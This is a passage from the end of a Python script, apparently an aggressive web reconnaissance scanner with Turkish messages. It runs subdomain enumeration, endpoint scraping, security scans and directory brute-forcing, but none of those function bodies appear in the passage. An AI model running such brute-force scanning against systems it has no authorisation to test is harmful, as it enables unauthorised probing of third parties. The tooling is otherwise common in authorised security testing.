    print(f"{Fore.YELLOW}[*] Agresif tarama başlatılıyor: {', '.join(config_settings['tools'])}, {config_settings['timeout']}s timeout, {config_settings['brute_threads']} paralel sorgu{Style.RESET_ALL}")

    await scanner.subdomain_enumeration(
        tools=config_settings['tools'],
        check_protocols=True,
        verify_subdomains=True,
        timeout=config_settings['timeout'],
        brute_threads=config_settings['brute_threads']
    )

    scanner.scrape_endpoints()
    await scanner.perform_security_scans()
    await scanner.directory_brute()
    scanner.save_results()
    scanner.analyze_results()

if __name__ == "__main__":
    asyncio.run(main())